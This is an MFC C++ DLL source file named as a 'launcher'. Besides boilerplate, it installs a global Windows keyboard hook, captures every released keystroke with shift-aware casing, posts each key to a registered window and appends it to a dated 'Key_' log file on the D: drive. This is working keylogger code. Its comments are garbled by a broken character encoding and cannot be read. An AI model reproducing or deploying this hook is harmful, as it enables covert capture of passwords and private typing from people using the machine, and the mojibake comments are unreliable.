// LaunchDll.cpp : ���� DLL �ĳ�ʼ�����̡�
//

#include "stdafx.h"
#include "LaunchDll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//
//TODO:  ����� DLL ����� MFC DLL �Ƕ�̬���ӵģ�
//		��Ӵ� DLL �������κε���
//		MFC �ĺ������뽫 AFX_MANAGE_STATE ����ӵ�
//		�ú�������ǰ�档
//
//		����: 
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// �˴�Ϊ��ͨ������
//		}
//
//		�˺������κ� MFC ����
//		������ÿ��������ʮ����Ҫ��  ����ζ��
//		��������Ϊ�����еĵ�һ�����
//		���֣������������ж������������
//		������Ϊ���ǵĹ��캯���������� MFC
//		DLL ���á�
//
//		�й�������ϸ��Ϣ��
//		����� MFC ����˵�� 33 �� 58��
//

// CLaunchDllApp

BEGIN_MESSAGE_MAP(CLaunchDllApp, CWinApp)
END_MESSAGE_MAP()


// CLaunchDllApp ����

CLaunchDllApp::CLaunchDllApp()
{
	// TODO:  �ڴ˴���ӹ�����룬
	// ��������Ҫ�ĳ�ʼ�������� InitInstance ��
}


// Ψһ��һ�� CLaunchDllApp ����

CLaunchDllApp theApp;


// CLaunchDllApp ��ʼ��

BOOL CLaunchDllApp::InitInstance()
{
	CWinApp::InitInstance();

	return TRUE;
}


DllExport void WINAPI InstallLaunchEv()
{
	Hook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD,
		(HOOKPROC)LauncherHook,
		theApp.m_hInstance,
		0);
}
DllExport void RegistMsg(HWND hwnd, long msg)
{
	hWnd = hwnd;
	Msg = msg;
}
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	LRESULT Result = CallNextHookEx(Hook, nCode, wParam, lParam);
	if (nCode == HC_ACTION)
	{
		if (wParam == 0x10)//shift
		{
			if (lParam & 0x80000000)//keyup
			{
				shift = false;
			}
			else
				shift = true;
			return Result;
		}
		if (lParam & 0x80000000)
		{
			char c[1];
			c[0] = wParam;
			if (!shift && (c[0]>=0x41) && (c[0]<=0x5A)) {
				c[0] += 0x20;
			}
			//������Ϣ
			if (Msg)
			{
				PostMessage(hWnd, Msg, (WPARAM)c[0], lParam);
			}
			SaveLog(c);
		}
	}
	return Result;
}

void SaveLog(char* c)
{
	CTime tm = CTime::GetCurrentTime();
	CString name;
	name.Format("D://Key_%d_%d.log", tm.GetMonth(), tm.GetDay());
	CFile file;
	if (!file.Open(name, CFile::modeReadWrite))
	{
		file.Open(name, CFile::modeCreate | CFile::modeReadWrite);
	}
	file.SeekToEnd();
	file.Write(c, 1);
	file.Close();
}